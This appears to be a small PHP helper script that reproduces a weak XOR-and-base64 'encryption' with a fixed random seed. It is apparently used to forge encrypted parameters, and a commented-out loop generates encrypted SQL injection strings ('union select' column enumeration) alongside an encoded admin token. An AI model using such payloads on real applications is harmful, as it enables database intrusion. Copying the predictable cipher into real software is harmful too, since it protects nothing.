<?php

	// warning! ugly code ahead :)
	// requires php5.x, sorry for that
  		
	function encrypt($str)
	{
		$cryptedstr = "";
		srand(3284724);
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ rand(0, 255);
			//echo rand(0,255)."\n";
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
  
	function decrypt ($str)
	{
		srand(3284724);
		if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
		{
			$str = base64_decode($str);
			if ($str != "" && $str != null && $str != false)
			{
				$decStr = "";
				
				for ($i=0; $i < strlen($str); $i+=3)
				{
					$array[$i/3] = substr($str,$i,3);
				}

				foreach($array as $s)
				{
					$a = $s ^ rand(0, 255);
					$decStr .= chr($a);
				}
				
				return $decStr;
			}
			return false;
		}
		return false;
	}

	// Admin = MDQyMjExMDE0MTgyMTQw
	/*$col = "";
	$str = "' union select ";
	for ($i=1; $i<=20 ; $i++)
	{
		$str .= $i == 10 ? $i."" : $i."";
		$copy = $str." #";
		echo encrypt($copy)."\n";
		$str .= ",";
	}*/

	echo encrypt($argv[1])."\n";
?>

